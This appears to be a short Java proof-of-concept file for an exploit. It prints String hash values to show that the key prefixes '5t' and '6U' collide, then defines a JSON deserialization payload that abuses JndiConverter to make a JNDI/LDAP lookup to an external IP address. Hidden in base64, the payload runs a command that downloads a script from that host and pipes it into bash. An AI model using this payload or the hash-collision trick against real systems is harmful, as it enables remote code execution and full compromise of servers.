public class hash {
    public static void main(String[] args) {
        String key = "5tH96uJyZ6SWxWR6";
        System.out.println(key.hashCode());

        String temp = "5t";
        System.out.println(temp.hashCode());

        String exp = "6U";
        System.out.println(exp.hashCode());

        String newKey = "6UH96uJyZ6SWxWR6";
        System.out.println(exp.hashCode());

        String poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +
                "\"AsText\":\"ldap://124.222.21.138:8089/TomcatBypass/Command/{echo,Y3VybCAxMjQuMjIyLjIxLjEzODoyMjMzL2luZGV4LnBocCB8IGJhc2g=}|{base64,-d|}{bash,-i|\"}";

    }
}
